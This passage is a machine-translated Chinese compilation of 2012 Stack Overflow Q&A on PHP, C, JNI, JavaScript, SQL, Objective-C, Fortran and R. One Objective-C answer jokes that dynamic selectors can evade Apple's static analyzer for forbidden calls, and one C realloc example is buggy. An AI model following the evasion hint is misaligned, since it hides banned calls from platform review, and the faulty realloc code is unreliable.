  $whatever =  $mainArray[$w][0];
} 
```

我试图计算每个数组的第一个元素中有多少条目是相同的，并且结果如下：

```
apple (2)
samsung (2)
microsoft (1)
nokia (1) 
```

我只是不确定这样做的正确方法是什么。

先感谢您。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-09T18:18:47.237

```
print_r(
    array_count_values(
        array_map('array_shift', $mainArray)
    )
); 
```

输出（[演示](http://eval.in/2620)）：

```
Array
(
    [apple] => 2
    [samsung] => 2
    [microsoft] => 1
    [nokia] => 1
) 
```

所以即使我是 的忠实粉丝`foreach`，为什么我没有在这里使用它？

首先，要计算数组中的值，在 PHP 中我们有[`array_count_values`](http://php.netarray_count_values). 它为我们完成了这项工作。

所以剩下的唯一问题是将所有第一个项目放入一个数组中以使用`array_count_values`. 这是一个典型的映射工作，我也喜欢映射，`foreach`所以我尝试了如果与工作[`array_map`](http://php.net/array_map)一起[`array_shift`](http://php.net/array_shift)工作 - 它确实如此。

但是，您可能想寻找一个名为`array_column`. PHP 本身尚不提供它，但[作为另一个答案中的 PHP 代码](https://stackoverflow.com/questions/11558397/count-specific-values-in-multidimensional-array/11558780#11558780)：

```
$counts = array_count_values(array_column($mainArray, 0)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T18:15:20.553

```
$count = array();
foreach($mainArray as $array) {
    $first = $array[0];
    if(!isset($count[$first])) $count[$first] = 0;
    $count[$first]++;
}

print_r($count); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-09T18:15:32.920

通过将深度数组的每个第一个元素推入一个新数组（`$result`在我的示例中）来收集它们，然后调用[`array_count_values()`](http://php.net/manual/en/function.array-count-values.php)该数组。像这样：

```
$mainArray = array(
  array("apple","two", "grren"),
  array("samsung","five", "red"),
  array("microsoft","one","gray"),
  array("apple","nine", "blue"),
  array("samsung","ten", "white"),
  array("nokia","seven", "yellow")
);

$result = array();
foreach( $mainArray as $k => $v )
{
    // let's continue if $v is not an array or is empty
    if( !is_array( $v ) || empty( $v ) ) continue;

    $result[] = $v[ 0 ];
}

var_dump( array_count_values( $result ) ); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-09T18:15:55.623

您可以遍历`$mainArray`以构建完整的数组/值列表，然后[`array_count_values()`](http://php.net/array_count_values)在其上使用：

```
$firstElements = array();
foreach ($mainArray as $arr) {
    $firstElements[] = $arr[0];
}
$counts = array_count_values($firstElements); 
```

另一种选择是循环`$mainArray`并插入该值作为数组的索引（如果它尚不存在），然后每次递增它（这将与`array_count_values()`最后做相同的事情）：

```
$counts = array();
foreach ($mainArray as $arr) {
    if (!isset($counts[$arr[0]])) $counts[$arr[0]] = 0;
    $counts[$arr[0]]++;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-09T18:16:34.360

你可以这样做：

```
foreach($mainArray as $n) {
  $count[$n[0]] = isset($count[$n[0]]) ? $count[$n[0]]++ : 1;
}

var_dump($count); //should give you something like
/*
array(4) {
  ["apple"]=>
  int(2)
  ["samsung"]=>
  int(2)
  ["microsoft"]=>
  int(1)
  ["nokia"]=>
  int(1)
}
*/ 
```

# java - 共享库 JNI 上的未定义引用

> ID：13313643
> 
> 赞同：0
> 
> 时间：2012-11-09T18:11:41.930
> 
> 标签：java, compiler-construction, linker, java-native-interface

好的，所以我正在使用 JNI + C 开发一些东西，并且 java 代码调用 .c 上的一个方法，该方法使用另一个编译的 C 代码，所以 Java -> C -> C。

但是在运行时，如果我不使用第二个 C 代码，一切正常，但是当我使用它时：

```
java: symbol lookup error: /home/adriano/Área de Trabalho/229/DFT/libDFT.so: undefined symbol: newComplex 
```

而 newComplex 在 complex.h

这就是我编译共享库的方式：

```
libDFT.so : DFT.o complex.o
gcc -shared -ansi -pedantic -Wall -O0 -g -ftest-coverage -fprofile-arcs -fPIC -I${JNI_INCLUDE} -I${JNI_INCLUDE}/linux/ -o $@ $< 
```

谢谢你的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T06:40:46.680

这是错误的：

```
libDFT.so : DFT.o complex.o
        gcc -shared ... -o $@ $< 
```

从[文档](http://www.gnu.org/software/make/manual/make.html#Implicit-Variables)：

> $<第**一个**先决条件
> 的名称。

 **你要：

```
libDFT.so : DFT.o complex.o
        gcc -shared ... -o $@ $^ 
```

（**所有**先决条件的名称。）**

# c - 二维数组的自动增长

> ID：13313644
> 
> 赞同：4
> 
> 时间：2012-11-09T18:11:43.657
> 
> 标签：c, arrays

在 C 语言中，有没有办法自动增长数组。例如：

```
int arr [100] [10]; 
```

如果阵列已满，是否可以“自动”变大？或者只有在您使用 C++ 时才有可能。你会怎么用C写这个？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:16:08.227

C 中没有这样的功能：您必须使用指针声明数组，手动检测“数组已满”条件，调用`malloc`，将副本复制到扩展数组和`free`原始数组中。即使是可变长度数组也不起作用，因为它们让您在每个数组生命周期中只设置一次大小。

在 C++ 中，您可以使用`std::vector<std::vector<int> >`普通数组来代替。您仍然需要检测“数组已满”的情况，但`std::vector<T>`容器会在调整大小时为您处理所有重新分配和扩展。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T18:18:06.083

C 中任何数组的“自动”增长是不可能的。如果你静态声明一个数组：

```
int arr[10]; 
```

但是，正如您所指出的，您有许多内存位置。如果您希望能够在运行时更改它，则需要使用动态声明它`malloc()`并使用使其更大`realloc()`

给你一个简单的例子：

```
int main(void){
    int input, count = 0, length = 2;
    int * arr = malloc(sizeof(int) * length); // array of size 2

    while((input = getchar()) != 'q') //get input from the user
    {
        getchar();                    //get rid of newlines
        arr[count] = input;           
        if(count + 1 == length){      // if our array is running out of space
            arr = realloc(arr, length * length);  // make it twice as big as it was
            length *= length;
        }
        count++;
    }

    for(length = 0; length < count; length++)  // print the contents
        printf("%d\n", arr[length]);

    free(arr);

    return 0;
} 
```

# coldfusion - 子目录中的 application.cfc 未从父目录中的 application.cfm 获取会话变量

> ID：13313654
> 
> 赞同：1
> 
> 时间：2012-11-09T18:12:12.360
> 
> 标签：coldfusion, application.cfc

我在文件夹 /wwwRoot/beta/ 中有一个 application.cfc。他们在根目录中有一个 application.cfm ，它设置了一堆会话变量。当我点击 beta 文件夹中的一个页面转储所有会话变量时，我看不到 application.cfm 中定义的那些。

我修改了我的 application.cfc 以删除“onSessionStart”中的所有代码。那没有帮助。我用一些我需要的应用程序变量创建了一个新的 application.cfm。那也没有帮助。

有人有什么建议吗？

```
 <cffunction name="onSessionStart" returnType="void" output="false" hint="Fires ONLY ONCE when session first created and not when session renewed/restarted.">
    <cfscript>
        session.startTime = Now();

    </cfscript>
    <cfreturn>
</cffunction> 
```

我想我需要一些如何复制现有会话变量的方法。

我在上面的文件夹中创建了一个简单的测试页面。

```
<cfset session.mynum= 1111>
 <a href="beta/index.cfm">clicky</a> 
```

当我单击链接时，会话转储不包括 myNum。application.cfc 中的某些东西正在搞砸事情。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T19:11:27.510

Application.cfc 不会受到父文件夹中的 Application.cfm 的影响。您应该将 Application.cfm 替换为 Application.cfc，然后在您的子文件夹中扩展父 Application.cfc。这就是 ColdFusion 中的应用程序框架的运作方式。

也就是说，如果您不能用 Application.cfc 替换 Application.cfm，那么您可以将会话变量定义分解到一个单独的文件中，然后将其 cfinclude 到 Application.cfm 中，然后在子级的 Application.cfc 中重复该包含文件夹。但是，您的 Application.cfm 中可能还有其他内容也不会包含在子文件夹中的 Application.cfc 中，因此这并不是一个很好的解决方案。最好的解决方案是完全摆脱 Application.cfm，用根目录中的适当 Application.cfc 替换它，然后根据需要从任何子文件夹扩展它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T19:35:57.210

发现问题了！在 application.cfc 我在顶部有以下内容：

```
 <cfscript>
   this.name = "myApp";
 </cfscipt> 
```

应用程序的名称必须与 application.cfm 中标签中使用的名称相同。更改名称后，我就可以获取会话变量。

谢谢

# python - Visual Studio 的 Python 工具在子进程中设置断点

> ID：13313671
> 
> 赞同：1
> 
> 时间：2012-11-09T18:13:56.640
> 
> 标签：python, visual-studio, debugging, multiprocessing, ptvs

有没有办法可以在 Visual Studio 可以附加到的子进程中设置断点？我尝试过的任何事情都没有成功。下面的示例代码。

```
child = multiprocessing.Process(target=foo)

def foo():
    print "This is the child process."
    # Breakpoint goes here.
    print "The breakpoint was just hit." 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-19T03:51:56.043

目前没有对此的支持。您可以执行 Debug->Attach to process 并附加到生成的进程，但我们目前不支持自动附加。

这是我们最终可能会为改进 Django 调试而添加的东西，但我建议在[pytools.codeplex.com](http://pytools.codeplex.com)上打开一个功能请求。

# javascript - 查找值是否包含在JS中的逗号分隔值中

> ID：13313675
> 
> 赞同：10
> 
> 时间：2012-11-09T18:14:07.493
> 
> 标签：javascript, string

给定这两个字符串：

```
var first = 'dog,cat,lion';
var second = 'cat'; 
```

我将如何知道第二个变量是否是第一个变量中的任何单词（用逗号分隔的单词）？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-11-09T18:28:11.677

您可以使用`Array.indexOf`：

```
if( first.split(',').indexOf(second) > -1 ) {
   // found
} 
```

需要 IE8- 支持？使用垫片：[https ://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/indexOf](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/indexOf)

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-11-09T18:15:53.313

这会起作用：

```
if( first.match(new RegExp("(?:^|,)"+second+"(?:,|$)"))) {
    // it's there
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-09T18:20:08.673

首先，将您的字符串拆分为一个数组：

```
var second = 'cat';
var first = 'dog,cat,lion';
var aFirst = first.split(','); 
```

然后循环浏览你的新数组

```
for (var i = 0; i < aFirst.length; i++) {
    if (aFirst[i] == second) {
        alert('jay!');
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-09T18:21:01.777

```
var first = 'dog,cat,lion';
var stringArray = first.split(',');       
for (var i=0; i<stringArray.length; i++) {
    if (stringArray[i].match("cat")) {
          alert('Its matched');
      }
 } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-09T19:04:20.057

```
var first = 'dog, cat, lion';
var second = 'cat';
// \b is a word boundary
// a word character, \w, consists of letters, digits and underscore
// remove the second paramater "i" if you want case-sensitive match
var containsRE = new RegExp(second, "i"); 
var startsWithRE = new RegExp("\\b"+second, "i"); 
var endsWithRE = new RegExp(second+"\\b", "i"); 
var exactRE = new RegExp("\\b"+second+"\\b", "i"); 
// test exactRE, for example, like so
if(exactRE.test(first)) {
    // matched
} 
```

# postgresql - 如果我的用户名包含句点，如何更改 postgresql 密码

> ID：13313680
> 
> 赞同：7
> 
> 时间：2012-11-09T18:14:49.647
> 
> 标签：postgresql

我想使用语法更改我的 pg/sql pwd

```
alter user username WITH PASSWORD '*****'; 
```

问题是我的用户名包含句点，例如`user.name`，并且系统似乎不允许用户名中包含句点。

那么如何更改我的密码呢？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-11-09T19:47:45.473

您必须**双引号**否则非法标识符。[更多在手册中。](http://www.postgresql.org/docs/current/interactive/sql-syntax-lexical.html#SQL-SYNTAX-IDENTIFIERS)

```
ALTER USER "a.b" WITH PASSWORD '*****'; 
```

更好的是：从不使用非法字符串开始。

# wso2 - 服务保存失败，没有更改

> ID：13313682
> 
> 赞同：2
> 
> 时间：2012-11-09T18:14:55.357
> 
> 标签：wso2

我在 wso2 治理注册表 4.1.1 版中的很多天都陷入了这个问题。在将服务从配置提升到开发状态（我在自定义生命周期中定义的新状态）之后，我正在尝试保存服务。如果我不对内容详细信息进行任何更改，则保存过程将无法返回此错误消息“资源在路径 /_system/governance/{serviceName} 中不存在”另一方面修改服务内容中的至少一个字段，没有错误出现。我找到了这个修复 [http://mail.wso2.org/mailarchive/carbon-commits/2012-January/053562.html](http://mail.wso2.org/mailarchive/carbon-commits/2012-January/053562.html) 但似乎没有解决我的问题。任何人都可以帮助我吗？

# iphone - 何时在 Objective C 中使用选择器

> ID：13313690
> 
> 赞同：1
> 
> 时间：2012-11-09T18:15:26.090
> 
> 标签：iphone, objective-c, performselector

> **可能重复：**
> [使用 -performSelector: 与仅调用方法](https://stackoverflow.com/questions/1493125/using-performselector-vs-just-calling-the-method)

我可以通过执行以下操作在我的应用程序中完成相同的任务：

```
[self performSelector:@selector(displayOneLife)]; 
```

和：

```
[self displayOneLife]; 
```

根据情况使用其中一种更好吗？如果是这样，有人可以为我详细说明吗？我只想使用 Objective-C 最佳实践。

谢谢你，乔伊

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:20:01.260

-performSelector 方法通常用于您想调用一些在编译时未知的选择器。例如，当用户点击它时，UIButton 使用它来调用连接到它的操作（按钮知道它在 IB 中连接的方法的名称以及它连接到的类）。

对于所有其他情况，您应该使用后者，因为您不想将代码转换为无法阅读的谜题。

PS -performSelector + 动态选择器名称构造可用于解决 Apple 的静态分析器，该分析器在二进制文件中寻找被禁止的调用:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T18:20:45.843

@selector 有一个非常特殊的用途，你不应该用它来调用已知的方法。

您使用@selector 通知其他类您应该调用的方法之一。

例如，您可以将类 countNumber 一个选择器传递给您的方法 @selector(result:) 以便其他类在完成其任务时调用您的方法。

示例代码：

```
- (void)calculateANumber
{
    [NumbersClass countNumber:myNumber withResult:@selector(result:)];
}

//This method will get called by NumbersClass, even tho it didnt know its existence before
- (void)result:(int)countResult
{
    myResult = countResult;
} 
```

只是一个例子，显然，它什么都不做

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-09T18:21:14.360

您可以将选择器存储在变量中，这`performSelector:`对于在编译时不知道要发送什么消息时很有用。例如，目标-动作系统是基于选择器的。这是控件的基本实现：

```
@interface FakeControl : NSObject

@property(nonatomic, strong) id target;
@property(nonatomic, assign) SEL action;

- (void)click;

@end

@implementation FakeControl

- (void)click {
    [target performSelector:action];
}

@end 
```

通过使用选择器，我们可以让控件在运行时在单击时发送我们想要的任何消息。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-09T18:20:27.907

如果你必须内联做一些事情，尤其是在同一个线程上

```
[self displayOneLife] 
```

足够好

但是有很多情况下，您想在另一个线程上执行，或者在延迟之后等。如果您只是键入，[self perform ...]，您会看到很多关于 performSelector 可用方法的建议，每个方法签名将帮助您了解它的作用。

选择其中一种方法，只需命令单击方法名称即可。它将向您显示有关该方法的作用等的详细信息。

这是一个很好的问题，但有很多答案。运行循环、线程、延迟、异步操作都是原因。

# python - 如何确定该行是否已插入？

> ID：13313694
> 
> 赞同：8
> 
> 时间：2012-11-09T18:15:36.590
> 
> 标签：python, sqlite

python使用sqlite3时，如何判断一行是否成功插入到表中？例如

```
conn = sqlite3.connect("test.db")
c = conn.cursor()

c.execute("INSERT INTO TEST VALUES ('sample text')")

c.commit()
c.close() 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-09T18:17:05.460

如果调用`execute()`or时没有抛出异常，`commit()`则调用时插入`commit()`。

成功提交事务是数据库层保证插入已写入磁盘的保证。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T18:17:25.273

你可以得到所有的行，看看它是否在那里：

```
SELECT * FROM TEST 
```

但是如果 SQLite 不起作用，它会给你一个错误消息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-09T18:17:39.173

您可以`count()`在插入之前和之后进行行。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-09T18:45:05.833

您可以尝试这样的事情来获得错误消息：

```
 try:
        c.execute("INSERT INTO TEST VALUES ('sample text')")
     except sqlite3.OperationalError, msg:
        print msg 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-07-13T09:55:16.733

您应该在`connection made`(db selected which is `conn`) not on 上进行提交`cursor`。

```
conn = sqlite3.connect("test.db")
c = conn.cursor()

c.execute("INSERT INTO TEST VALUES ('sample text')")
#commit the changes to db   
conn.commit()
conn.close() 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-05-06T12:48:58.973

首先，您应该对连接对象而不是游标进行提交，即 `conn.commit()`不是`c.commit()`

然后您可以检查`lastrowid`光标以确定插入是否成功`conn.commit()`

`c.lastrowid`

# ios6 - xibs 和模拟器有问题

> ID：13313702
> 
> 赞同：1
> 
> 时间：2012-11-09T18:16:00.147
> 
> 标签：ios6, xcode4.3

我试图制作应用程序，并且总是在我在 xib 中设置元素时，它看起来很好，然后我打开运行 6.0 的模拟器，有些元素看起来比它们应该的要低，或者有些比 xib 中的大一点。

为什么是这样？我取消选中“使用自动布局”，但它仍然以不同的方式出现。

任何想法？

# fortran - 为什么 xlf 和 ifort 在 Array Bounds Read 上采取不同的方式？

> ID：13313703
> 
> 赞同：2
> 
> 时间：2012-11-09T18:16:04.220
> 
> 标签：fortran

我正在尝试将代码从 ifort 编译器移植到 ibm xlf 编译器。它在 redhat 上的 ifort 下运行良好，但在 AIX 系统上的 xlf 下给出的结果包含“NaNQ”。事实证明，代码中有一个数组边界读取会导致这个问题，这里有一个简化的例子：

```
program main                                                                                                                                                    
implicit none                                                                                                                                                   
real(8)::a(1,0:10)=0.D0                                                                                                                                         

print *, a(1,-1)                                                                                                                                                
end program main 
```

使用这两个编译器我可以成功编译它，没有任何错误或警告。在 ifort 我得到结果：

```
0.000000000000000E+000 
```

但是在 xlf 上，我得到：

```
0.247032822920623272E-322 
```

但是，如果我在边界之外阅读更多内容，xlf 将无法编译，但 ifort 编译成功。

```
program main                                                                                                                                                    
implicit none                                                                                                                                                   
real(8)::a(1,0:10)=0.D0                                                                                                                                         

print *, a(1,-3:-1)                                                                                                                                                
end program main 
```

在 ifort 我得到：

```
0.000000000000000E+000  0.000000000000000E+000  0.000000000000000E+000 
```

在 xlf 上它不会编译：

```
"1.f90", line 5.9: 1516-023 (S) Subscript is out of bounds.
** main   === End of Compilation 1 ===
1501-511  Compilation failed for file 1.f90. 
```

为什么 ifort 和 xlf 在这种跨界读取上采取不同的方式？有什么办法让编译器严格检查并防止发生跨界读取？毕竟，我花了很长时间才在我们的代码中发现这个错误，因为我们小组已经使用这个代码超过 15 年，在 ifort 上没有任何问题。谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T18:26:54.953

大多数 Fortran 编译器都有在运行时检查数组边界错误的选项。在这些具有常量索引的示例中，可以在编译时发现错误，一些编译器而不是其他编译器在不使用非默认选项的情况下会这样做。使用 ifort 使用 -check bounds 请求数组边界检查。您可以使用 -check all 进行额外检查。这些选项通常不是默认选项，因为存在运行时成本。但是得到错误答案的成本可能要高得多！我发现运行时成本经常低得惊人，建议在代码开发期间使用运行时检查，如果运行时成本可以接受，甚至在生产中使用。

# r - 如何在 R 中删除向量中的 NA 值

> ID：13313704
> 
> 赞同：16
> 
> 时间：2012-11-09T18:16:04.467
> 
> 标签：r, vector, numeric, na

我有一个存储超过 1000 个值的向量。前 50 个值是 NA，我怎样才能摆脱它？

```
c(NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, 
NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, 
NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, NA, 
NA, NA, NA, 1.5741, 1.583, 1.605, 1.633, 1.6465, 1.6475, 1.6329, 
1.6413, 1.685, 1.692, 1.7087, 1.7055, 1.6985, 1.6807, 1.6745, 
1.673, 1.6625, 1.6805, 1.689, 1.667, 1.684, 1.6675, 1.6867, 1.6688, 
1.6643, 1.6685, 1.7025, 1.737, 1.7663, 1.742, 1.7535, 1.749, 
1.7494, 1.75, 1.711, 1.7145, 1.7205, 1.751, 1.7295, 1.7205, 1.7325, 
1.731, 1.7235, 1.712, 1.6967, 1.6872, 1.696, 1.7354, 1.729, 1.712, 
1.7208, 1.7115, 1.7035, 1.7032, 1.6947, 1.715, 1.7181, 1.742, 
1.7471, 1.7438, 1.7493, 1.7525, 1.773, 1.7695, 1.7735, 1.7895, 
1.7905, 1.7945, 1.798, 1.8138, 1.791, 1.7915, 1.802, 1.7812, 
1.7925, 1.7873, 1.7952, 1.808, 1.8265, 1.8369, 1.83, 1.8347, 
1.826, 1.8079, 1.8165, 1.8104, 1.8333, 1.7864, 1.7878, 1.801, 
1.79, 1.7745, 1.7493, 1.7625, 1.7575, 1.739, 1.7615, 1.739, 1.7521, 
1.752, 1.7445, 1.7585, 1.7375, 1.7188, 1.709, 1.7092, 1.7154, 
1.7273, 1.724, 1.7323, 1.7365, 1.7495, 1.7643, 1.8165, 1.811, 
1.7395, 1.7365, 1.749, 1.7485, 1.748, 1.738, 1.743, 1.747, 1.7457, 
1.7375, 1.738, 1.7391, 1.7155, 1.6909, 1.6953, 1.6984, 1.6795, 
1.6885, 1.672, 1.669, 1.6815, 1.6895, 1.6855, 1.6697, 1.6845, 
1.683, 1.6865, 1.6715, 1.6628, 1.6687, 1.6674, 1.6638, 1.682, 
1.6825, 1.6953, 1.6915, 1.6955, 1.69, 1.7, 1.7105, 1.704, 1.705, 
1.6867, 1.6917, 1.6954, 1.71, 1.702, 1.6985, 1.7185, 1.6898, 
1.6725, 1.6725, 1.6515, 1.6305, 1.6355, 1.642, 1.631, 1.6425, 
1.6375, 1.6355, 1.634, 1.6285, 1.6358, 1.6069, 1.602, 1.5995, 
1.595, 1.582, 1.584, 1.5825, 1.6193, 1.6163, 1.6248, 1.6073, 
1.615, 1.6125, 1.5865, 1.5718, 1.5714, 1.575, 1.579, 1.5835, 
1.586, 1.5774, 1.5755, 1.5715, 1.557, 1.5345, 1.5115, 1.5208, 
1.508, 1.5175, 1.5165, 1.517, 1.5268, 1.5444, 1.5195, 1.518, 
1.5135, 1.5658, 1.583, 1.5757, 1.5945, 1.6245, 1.6135, 1.609, 
1.5923, 1.586, 1.5915, 1.6032, 1.5893, 1.6125, 1.5965, 1.5972, 
1.6142, 1.6085, 1.5995, 1.5907, 1.585, 1.5755, 1.563, 1.5768, 
1.5917, 1.607, 1.6273, 1.623, 1.6223, 1.6455, 1.6438, 1.6435, 
1.653, 1.6518, 1.647, 1.651, 1.6415, 1.6367, 1.6415, 1.6579, 
1.672, 1.6737, 1.669, 1.6615, 1.6715, 1.663, 1.668, 1.6665, 1.662, 
1.6495, 1.649, 1.6715, 1.6725, 1.6691, 1.6655, 1.6502, 1.6605, 
1.6425, 1.6465, 1.645, 1.6545, 1.644, 1.6231, 1.6245, 1.6243, 
1.6256, 1.616, 1.637, 1.6572, 1.652, 1.663, 1.669, 1.6685, 1.6693, 
1.667, 1.6633, 1.662, 1.6495, 1.6525, 1.6545, 1.6588, 1.6495, 
1.6395, 1.6482, 1.6391, 1.629, 1.637, 1.6462, 1.64, 1.6235, 1.6165, 
1.6105, 1.6125, 1.5965, 1.5907, 1.6027, 1.6145, 1.6175, 1.6135, 
1.6125, 1.639, 1.629, 1.607, 1.612, 1.6051, 1.6049, 1.603, 1.588, 
1.5883, 1.591, 1.5944, 1.5793, 1.577, 1.575, 1.5645, 1.5769, 
1.5665, 1.5737, 1.5665, 1.5639, 1.5504, 1.5402, 1.536, 1.5158, 
1.5246, 1.5215, 1.5102, 1.5183, 1.5117, 1.4945, 1.4945, 1.5135, 
1.495, 1.4772, 1.4832, 1.4793, 1.4785, 1.4589, 1.4965, 1.4865, 
1.4872, 1.4835, 1.5037, 1.4815, 1.4745, 1.4815, 1.4835, 1.478, 
1.4753, 1.475, 1.4775, 1.477, 1.4707, 1.4661, 1.4684, 1.4626, 
1.4558, 1.467, 1.463, 1.4568, 1.453, 1.4478, 1.4275, 1.4035, 
1.399, 1.4065, 1.4083, 1.4062, 1.4001, 1.3924, 1.3915, 1.4133, 
1.4032, 1.4015, 1.3908, 1.41, 1.4095, 1.4482, 1.483, 1.4862, 
1.524, 1.4861, 1.5, 1.4815, 1.4938, 1.5, 1.486, 1.484, 1.451, 
1.424, 1.417, 1.4235, 1.409, 1.4164, 1.432, 1.4435, 1.4728, 1.493, 
1.4685, 1.47, 1.466, 1.4526, 1.4815, 1.4875, 1.5215, 1.5105, 
1.5063, 1.5318, 1.537, 1.5345, 1.5374, 1.538, 1.5362, 1.569, 
1.5625, 1.569, 1.5795, 1.5945, 1.589, 1.594, 1.5845, 1.5875, 
1.567, 1.5885, 1.5995, 1.597, 1.5795, 1.599, 1.6002, 1.6015, 
1.5935, 1.5955, 1.6005, 1.5945, 1.576, 1.5705, 1.5818, 1.596, 
1.5625, 1.5575, 1.5665, 1.579, 1.5775, 1.569, 1.5675, 1.554, 
1.5605, 1.566, 1.567, 1.5875, 1.5945, 1.598, 1.6092, 1.617, 1.6142, 
1.6195, 1.637, 1.6265, 1.6345, 1.635, 1.639, 1.6305, 1.6325, 
1.6325, 1.6195, 1.6325, 1.6135, 1.6115, 1.6055, 1.615, 1.5935, 
1.573, 1.579, 1.586, 1.585, 1.611, 1.6365, 1.643, 1.6465, 1.656, 
1.6545, 1.6555, 1.6545, 1.6595, 1.6575, 1.6615, 1.6587, 1.63, 
1.628, 1.633, 1.6365, 1.6285, 1.614, 1.6195, 1.6335, 1.6455, 
1.646, 1.643, 1.6475, 1.6355, 1.672, 1.6625, 1.668, 1.665, 1.661, 
1.6665, 1.662, 1.6615, 1.6645, 1.654, 1.6335, 1.6375, 1.6305, 
1.6265, 1.6425, 1.6315, 1.629, 1.618, 1.6085, 1.596, 1.6105, 
1.5965, 1.611, 1.617, 1.6065, 1.6035, 1.6035, 1.578, 1.5925, 
1.606, 1.6147, 1.5995, 1.595, 1.6035, 1.606, 1.582, 1.567, 1.5805, 
1.5855, 1.5815, 1.5845, 1.5815, 1.5715, 1.5775, 1.5795, 1.5825, 
1.6055, 1.6084, 1.6135, 1.616, 1.602, 1.6165, 1.624, 1.624, 1.6145, 
1.6255, 1.6378, 1.63, 1.6315, 1.607, 1.5868, 1.5895, 1.5927, 
1.5948, 1.6004, 1.626, 1.6195, 1.6225, 1.637, 1.629, 1.6235, 
1.628, 1.6375, 1.6605, 1.6568, 1.681, 1.6895, 1.6955, 1.6925, 
1.7095, 1.7032, 1.6987, 1.692, 1.704, 1.6976, 1.6965, 1.696, 
1.698, 1.7091, 1.707, 1.721, 1.7286, 1.7204, 1.7165, 1.7241, 
1.7205, 1.7037, 1.7053, 1.6975, 1.7075, 1.72, 1.7245, 1.7243, 
1.7185, 1.7385, 1.7402, 1.712, 1.7057, 1.71, 1.712, 1.6975, 1.7, 
1.7115, 1.721, 1.7158, 1.7132, 1.6904, 1.6965, 1.6782, 1.6865, 
1.6767, 1.686, 1.679, 1.6868, 1.6665, 1.6645, 1.6738, 1.677, 
1.658, 1.6445, 1.623, 1.611, 1.6075, 1.6177, 1.5985, 1.5935, 
1.612, 1.6085, 1.5935, 1.6047, 1.6092, 1.608, 1.6187, 1.6325, 
1.6443, 1.645, 1.6295, 1.6178, 1.6133, 1.6335, 1.6265, 1.623, 
1.6255, 1.6221, 1.6215, 1.601, 1.604, 1.5935, 1.604, 1.6145, 
1.6137, 1.6285, 1.6377, 1.647, 1.663, 1.676, 1.673, 1.682, 1.6794, 
1.6788, 1.6774, 1.694, 1.6965, 1.6937, 1.6957, 1.691, 1.6842, 
1.696, 1.6925, 1.691, 1.6908, 1.6865, 1.7023, 1.706, 1.7095, 
1.7145, 1.7032, 1.7005, 1.7027, 1.7082, 1.7118, 1.707, 1.7148, 
1.7165, 1.7211, 1.7208, 1.7062, 1.7045, 1.704, 1.7055, 1.6985, 
1.706, 1.7125, 1.7163, 1.7078, 1.705, 1.7125, 1.7077, 1.701, 
1.6935, 1.6965, 1.7019, 1.7008, 1.7175, 1.735, 1.7365, 1.7371, 
1.7398, 1.7399, 1.7397, 1.7333, 1.7308, 1.7398, 1.7366, 1.752, 
1.7505, 1.7553, 1.7487, 1.744, 1.7358, 1.7474, 1.7504, 1.7528, 
1.748, 1.7441, 1.7273, 1.7444, 1.727, 1.7343, 1.7314, 1.736, 
1.763, 1.7658, 1.7603, 1.7534, 1.7517, 1.7438, 1.7255, 1.7219, 
1.734, 1.718, 1.7275, 1.7269, 1.7279, 1.7306, 1.7055, 1.7069, 
1.709, 1.7037, 1.7088, 1.7198, 1.7184, 1.7155, 1.707, 1.6893, 
1.6779, 1.6898, 1.6963, 1.691, 1.68, 1.6961, 1.6979, 1.6885, 
1.685, 1.6726, 1.668, 1.6728, 1.6675, 1.6788, 1.6695, 1.6952, 
1.6985, 1.7071, 1.7151, 1.7181, 1.7134, 1.708, 1.7188, 1.7135, 
1.7088, 1.7124, 1.7202, 1.701, 1.694, 1.6882, 1.6947, 1.6794, 
1.6801, 1.6727, 1.6697, 1.657, 1.6501, 1.6461, 1.662, 1.6682, 
1.6661, 1.6579, 1.6705, 1.6735, 1.6708, 1.6671, 1.674, 1.6683, 
1.6596, 1.6551, 1.6463, 1.6456, 1.6478, 1.6447, 1.6438, 1.6444, 
1.6466, 1.6435, 1.6428, 1.6515, 1.6665, 1.6692, 1.6695, 1.6698, 
1.6721, 1.6672, 1.65, 1.6443, 1.6354, 1.6319, 1.6299, 1.5986, 
1.6009, 1.6006, 1.6035, 1.5972, 1.5758, 1.5849, 1.5825, 1.5915, 
1.5946, 1.5965, 1.5826, 1.5685, 1.5745, 1.5741, 1.54, 1.5235, 
1.5383, 1.5457, 1.5558, 1.5428, 1.5569, 1.5662, 1.576, 1.5955, 
